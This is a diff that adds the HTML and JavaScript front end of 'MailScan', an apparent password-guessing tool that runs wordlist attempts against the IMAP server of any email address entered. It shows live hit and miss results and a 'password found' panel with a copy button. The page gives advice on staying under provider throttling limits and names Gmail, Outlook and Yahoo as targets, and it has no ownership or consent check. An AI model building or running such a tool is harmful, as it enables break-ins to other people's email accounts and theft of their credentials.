@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>MailScan</title>
+<style>
+:root{--bg:#07090d;--line:#1b2330;--grn:#00ff9c;--red:#ff3b4c;--amb:#ffb020;
+--txt:#e9eff8;--dim:#78849a;--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--txt);font-family:var(--mono);
+min-height:100vh;padding:26px 16px 60px;display:flex;justify-content:center}
+.wrap{width:100%;max-width:640px}
+h1{font-size:22px;letter-spacing:-.5px;margin:0 0 4px}
+.sub{font-size:11px;letter-spacing:.2em;color:var(--dim);text-transform:uppercase;margin-bottom:22px}
+label{display:block;font-size:10px;letter-spacing:.18em;color:var(--dim);
+text-transform:uppercase;margin:0 0 7px}
+input,select{width:100%;background:#04070b;border:1px solid var(--line);border-radius:11px;
+padding:16px 14px;color:var(--txt);font-family:var(--mono);font-size:15px}
+input:focus,select:focus{outline:0;border-color:#2b4a6b}
+.row{display:flex;gap:9px;margin-top:12px}
+button{border:0;border-radius:11px;font-family:var(--mono);font-size:12.5px;font-weight:700;
+letter-spacing:.1em;text-transform:uppercase;padding:16px 20px;cursor:pointer}
+.go{flex:1;background:linear-gradient(180deg,#00ff9c,#00c979);color:#03150c}
+.stop{background:#1a0a0e;border:1px solid #4a1220;color:var(--red)}
+button:disabled{opacity:.4;pointer-events:none}
+.adv{margin-top:14px;font-size:11px;color:var(--dim)}
+.adv summary{cursor:pointer;letter-spacing:.1em;text-transform:uppercase;font-size:10px}
+.adv input,.adv select{margin-top:9px;padding:12px}
+#hit{display:none;margin:22px 0;padding:20px 16px;border:1px solid #0d5c3c;
+background:linear-gradient(180deg,#03170f,#040b08);border-radius:14px;text-align:center}
+#hit .k{font-size:10px;letter-spacing:.24em;color:var(--grn);text-transform:uppercase}
+#hit .v{font-size:34px;font-weight:800;color:#fff;word-break:break-all;margin:10px 0;
+letter-spacing:-.5px;line-height:1.1}
+#hit .m{font-size:11px;color:var(--dim)}
+#hit button{margin-top:14px;background:#0b2a1e;border:1px solid #1c5c42;color:#8ff0c4;padding:11px 18px}
+.bar{height:5px;background:#111826;border-radius:99px;overflow:hidden;margin:18px 0 10px;display:none}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#00c979,#00ff9c);
+transition:width .2s}
+.meta{display:flex;justify-content:space-between;font-size:10.5px;color:var(--dim);letter-spacing:.06em}
+#list{height:230px;overflow:auto;background:#04070b;border:1px solid #131a24;border-radius:11px;
+padding:9px 11px;font-size:11px;line-height:1.75;margin-top:12px;color:#5f7a8b}
+#list div{display:flex;justify-content:space-between;gap:10px}
+#list .ok{color:var(--grn);font-weight:700}
+#list .bad{color:#43505f}
+.err{color:var(--red);font-size:12px;margin-top:12px;display:none}
+.note{font-size:10.5px;color:#4d5a70;line-height:1.7;margin-top:26px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>MailScan</h1>
+  <div class="sub">IMAP wordlist checker</div>
+
+  <label for="email">Email address</label>
+  <input id="email" type="email" placeholder="someone@gmail.com" autocomplete="off" spellcheck="false">
+  <div class="row">
+    <button class="go" id="go">Start scan</button>
+    <button class="stop" id="stop" disabled>Stop</button>
+  </div>
+
+  <details class="adv">
+    <summary>Advanced</summary>
+    <label for="limit" style="margin-top:12px">Depth</label>
+    <select id="limit">
+      <option value="60">Quick — 60 candidates (Gmail / Outlook safe)</option>
+      <option value="150" selected>Standard — 150 candidates</option>
+      <option value="400">Deep — 400 candidates (Yahoo / cPanel only)</option>
+    </select>
+    <label for="host" style="margin-top:12px">Custom IMAP host</label>
+    <input id="host" placeholder="imap.example.com" autocomplete="off" spellcheck="false">
+  </details>
+
+  <div class="err" id="err"></div>
+  <div class="bar" id="bar"><i></i></div>
+  <div class="meta"><span id="st"></span><span id="cnt"></span></div>
+
+  <div id="hit">
+    <div class="k">password found</div>
+    <div class="v" id="pv"></div>
+    <div class="m" id="pm"></div>
+    <button id="cp">Copy password</button>
+  </div>
+
+  <div id="list"></div>
+
+  <div class="note">
+    Attempts run live against the provider's IMAP server at ~2 concurrent. Gmail and Outlook
+    accounts with 2FA need an <b>app password</b> — the real password will never match.
+    Most providers throttle after 15–25 failures, so Quick is the sane default on those.
+  </div>
+</div>
+
+<script>
+const $ = s => document.querySelector(s);
+let es = null, t0 = 0, timer = null, total = 0;
+
+function setState(t) { $("#st").textContent = t; }
+
+function stop() {
+  if (es) { es.close(); es = null; }
+  clearInterval(timer);
+  $("#go").disabled = false;
+  $("#stop").disabled = true;
+  $("#bar").style.display = "none";
+}
+
+$("#go").onclick = () => {
+  const email = $("#email").value.trim();
+  const host = $("#host").value.trim();
+  const limit = $("#limit").value;
+  if (!email) { $("#email").focus(); return; }
+
+  $("#list").innerHTML = "";
+  $("#hit").style.display = "none";
+  $("#err").style.display = "none";
+  $("#cnt").textContent = "";
+  $("#go").disabled = true;
+  $("#stop").disabled = false;
+  $("#bar").style.display = "block";
+  $("#bar i").style.width = "0%";
+  setState("connecting…");
+  t0 = Date.now();
+  clearInterval(timer);
+  timer = setInterval(() => setState("running · " + ((Date.now() - t0) / 1000).toFixed(0) + "s"), 1000);
+
+  es = new EventSource("/api/scan?email=" + encodeURIComponent(email) +
+    "&host=" + encodeURIComponent(host) + "&limit=" + encodeURIComponent(limit));
+
+  es.onmessage = ev => {
+    const d = JSON.parse(ev.data);
+
+    if (d.type === "start") {
+      total = d.total;
+      setState("target " + d.host + " · " + total + " candidates");
+    }
+    if (d.type === "error") {
+      $("#err").textContent = d.msg;
+      $("#err").style.display = "block";
+      stop();
+    }
+    if (d.type === "try") {
+      $("#cnt").textContent = d.n + " / " + total;
+      $("#bar i").style.width = (d.n / total * 100) + "%";
+      const row = document.createElement("div");
+      row.dataset.p = d.pass;
+      row.innerHTML = "<span>" + d.n + ". " + d.pass.replace(/</g, "&lt;") + "</span><span>…</span>";
+      $("#list").prepend(row);
+    }
+    if (d.type === "miss") {
+      const row = $("#list").querySelector('[data-p="' + CSS.escape(d.pass) + '"]');
+      if (row) { row.classList.add("bad"); row.lastChild.textContent = "miss"; }
+    }
+    if (d.type === "hit") {
+      const row = $("#list").querySelector('[data-p="' + CSS.escape(d.pass) + '"]');
+      if (row) { row.classList.add("ok"); row.lastChild.textContent = "HIT"; }
+      $("#pv").textContent = d.pass;
+      $("#pm").textContent = "attempt " + d.n + " · " + (d.ms / 1000).toFixed(1) + "s";
+      $("#hit").style.display = "block";
+      $("#hit").scrollIntoView({ behavior: "smooth", block: "center" });
+      $("#bar i").style.width = "100%";
+      setState("hit");
+      stop();
+    }
+    if (d.type === "done") {
+      setState("finished · no match in " + d.n + " attempts");
+      $("#bar").style.display = "none";
+      stop();
+    }
+  };
+
+  es.onerror = () => { if (es) { stop(); setState("connection lost"); } };
+};
+
+$("#stop").onclick = () => { stop(); setState("stopped"); };
+
+$("#cp").onclick = async () => {
+  try { await navigator.clipboard.writeText($("#pv").textContent); } catch (e) {}
+  $("#cp").textContent = "Copied";
+  setTimeout(() => ($("#cp").textContent = "Copy password"), 1500);
+};
+</script>
+</body>
+</html>
